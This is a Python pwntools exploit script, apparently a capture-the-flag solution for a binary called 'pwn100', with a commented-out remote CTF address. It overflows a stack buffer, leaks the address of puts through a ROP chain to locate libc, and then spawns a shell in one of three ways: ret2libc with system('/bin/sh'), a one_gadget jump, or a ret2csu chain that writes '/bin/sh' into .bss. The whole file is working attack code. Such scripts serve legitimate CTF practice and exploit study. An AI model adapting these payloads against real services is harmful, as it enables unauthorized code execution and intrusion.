from pwn import *
from LibcSearcher import *

p = process("./pwn100")
context(log_level='debug', arch='amd64', os='linux')
# p = remote('61.147.171.105',59579)
elf = ELF('./pwn100')
libc = ELF('./libc.so.6')
context.log_level = 'debug'

main_addr = 0x4006b8
pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']
setbuf_got = elf.got['setbuf']

payload = flat('a' * (0x40 + 8), pop_rdi, puts_got, puts_plt, main_addr)
payload = payload.ljust(200, b'a')
p.send(payload)
p.recvuntil('bye~\n')

# leak_addr
leak_addr = u64(p.recvuntil('\n')[:-1].ljust(8, b'\x00'))
print(hex(leak_addr))

# libc_base = leak_addr - libc.sym['puts'] + 0x30
# print(hex(libc.sym['puts']))
# gdb.attach(p)

'''
libc = LibcSearcher('puts',leak_addr)

system_addr = libc_base + libc.sym['system']
#bin_sh_addr = libc_base + libc.sym['str_bin_sh']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00')) #-0x1e4 +0xf2	
#malloc = libc_base + libc.sym["__malloc_hook"]
#print(hex(malloc))
print(hex(bin_sh_addr))
print(hex(system_addr))
#
'''

# libc = LibcSearcher('puts', leak_addr)
# libc_base = leak_addr - libc.dump('puts')
# system_addr = libc_base + libc.dump('system')
# bin_sh_addr = libc_base + libc.dump('str_bin_sh')

offset = leak_addr - libc.sym["puts"]
system_addr = libc.sym["system"] + offset
bin_sh_addr = libc.search(b'/bin/sh').__next__() + offset


# bin_sh = next(libc.search(b"/bin/sh")) + offset
# read_addr to /bin/sh by .bss
def test_1():
    # try 1  ret2libc
    payload = flat('a' * 0x40, 'a' * 8, pop_rdi, bin_sh_addr, system_addr, main_addr)
    payload = payload.ljust(200, b'a')
    # gdb.attach(p)
    p.sendline(payload)


def test_2():
    '''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
    '''
    libc_base = leak_addr - libc.sym['puts'] + 0x50
    print(hex(libc.sym['puts']))
    # libc = LibcSearcher('puts',leak_addr)

    system_addr = libc_base + libc.sym['system']
    # print(hex(system_addr))
    # bin_sh_addr = libc_base + libc.sym['str_bin_sh']
    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
    malloc = libc_base + libc.sym["__malloc_hook"]
    print(hex(malloc))
    # try 2 one_gadget
    # libc_base = leak_addr - libc.sym["puts"]
    one_gadget = libc_base + 0x4f2c5
    ret_addr = 0x00000000004004e1
    # gdb.attach(p)
    payload = b'a' * 0x40 + b'a' * 8 + p64(one_gadget)
    payload = payload.ljust(200, b'a')
    p.send(payload)


def test_3():
    '''
    rbx = 0 + 1
    rbp = 1
    r12 = read_got
    r13 = 8
    r14 = bin_sh 'bin/sh\x00'
    r15 = 0

    rdx = 8
    rsi = bin_sh_addr
    rdi = 0
    call read_got
    '''
    # ROP_addr
    rop_1_addr = 0x40075A # pop rbx
    rop_2_addr = 0x400740 # mov rdx, r13
    bin_sh = 0x601500
    gdb.attach(p, 'b*0x00004006A7\nc')
    # rbp = 1 stop continue while
    # payload = b'a' * 0x40 + b'a' * 0x8
    # payload += p64(rop_1_addr) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(bin_sh) + p64(0)
    payload = flat('a' * (0x40 + 8), rop_1_addr, 0, 1, read_got, 8, bin_sh, 0)
    payload += flat(rop_2_addr, b'a' * 56, main_addr)
    payload = payload.ljust(200, b'a')
    p.send(payload)

    p.recvuntil('bye~\n')
    p.send('/bin/sh\x00')

    # payload += p64(rop_1_addr) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(bin_sh) + p64(0)
    # payload += p64(rop_2_addr) + b'a'*56 + p64(main_addr)
    # payload = payload.ljust(200,b'a')
    payload = flat('a' * (0x40 + 8), pop_rdi, bin_sh, system_addr, 0xdeadbeef)
    payload = payload.ljust(200, b'a')
    p.sendline(payload)


# test_1()
# test_2()
test_3()
p.interactive()
